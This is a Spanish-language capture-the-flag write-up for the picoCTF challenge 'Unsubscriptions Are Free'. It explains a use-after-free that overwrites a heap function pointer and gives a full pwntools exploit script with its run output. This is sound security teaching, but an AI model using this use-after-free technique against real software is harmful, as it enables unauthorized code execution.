# Unsubscriptions Are Free

En este ejercicio nos dan un binario y su código fuente.

```c
checksec
File:     /home/ub1cu0/Desktop/picoCTF/Unsubscriptions_Are_Free/vuln_patched
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

El programa es un menú con bastantes opciones:

```c
./vuln_patched
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
```

La mayoría simplemente imprimen algo y no son relevantes, si miramos el código podemos ver varias zonas críticas en el código:

```c
typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

cmd *user;
```

Aquí se define un `struct` llamado `cmd` con dos campos, ambos punteros.\
El primero (`whatToDo`) es un **puntero a función**, es decir, guarda una dirección a una función que se puede ejecutar.\
El segundo (`username`) es un puntero a una cadena de texto. Luego, declara un puntero `user` de tipo del struct creado anteriormente

```c
void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}
```

La función `doProcess` hace un call a donde apunte el puntero `whatToDo`.

Esto implica que si conseguimos modificar a donde apunte `whatToDo` cada vez que el programa ejecute la función `doProcess` el flujo del programa irá a donde nosotros queramos. Como podemos conseguir modificarlo? Vamos a ver como usa `user` el programa:

```c
int main(){
. . .
	user = (cmd *)malloc(sizeof(user)); // Aquí
. . .
}
```

El programa crea un user en el heap así que nuestro objetivo es el heap. La estructura del heap en ese caso sería que donde apunta user estará el primer argumento del struct, es decir, el puntero que queremos modificar y 4 bytes después estará el parámetro username.

Si miramos mas el código vamos a ver que tenemos el control de 2 cosas importantes:

```c
void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}
```

y

```c
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user); // Tenemos control del free
	}else{
		puts("Ok. Get premium membership please!");
	}
}
```

Como podemos ver, la primera función nos permite escribir algo en el heap, así que busca el primer hueco libre y escribe ahí lo que metamos en la variable `msg`.\
En la segunda función, podemos hacer un `free(user)`, y como `user` es de tipo `cmd`, que es un struct de 8 bytes (4 bytes para la dirección de la función y 4 para el username), el programa marcará ese bloque como libre.

Esto significa que, cuando volvamos a usar `malloc(8)` (como ocurre al escribir en `msg`), nos dará ese mismo bloque de nuevo. Entonces, lo que escribamos sobrescribirá tanto el puntero a función como el puntero al nombre de usuario dentro del struct `user`.

Ahora que tenemos control sobre esos 8 bytes, podemos redirigir el flujo del programa a donde queramos. Si echamos un ojo al binario, vemos que hay una función llamada `hahaexploitgobrrr` que imprime la flag:

```c
void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}
```

Así que con eso ya estamos listos para hacer el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b doProcess
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("mercury.picoctf.net", 61817)

def main():
    io = conn()
    
    io.sendlineafter(b'(e)xit\n' , b's')
    win_addr = int(io.recvline().decode().strip().split('...')[1], 16)
    log.success(f'Dirección Win: {hex(win_addr)}')
    
    io.sendline(b'i')
    io.recvline()
    io.sendlineafter(b"You're leaving already(Y/N)?\n" , b'Y')
    
    io.sendlineafter(b'(e)xit\n' , b'L')
    io.sendlineafter(b':', p32(win_addr))
    
    io.interactive()

if __name__ == "__main__":
    main()

```

```c
python solve.py       

[*] '/home/ub1cu0/Desktop/picoCTF/Unsubscriptions_Are_Free/vuln_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Opening connection to mercury.picoctf.net on port 61817: Done
[+] Dirección Win: 0x80487d6
[*] Switching to interactive mode

picoCTF{SECRET}
```
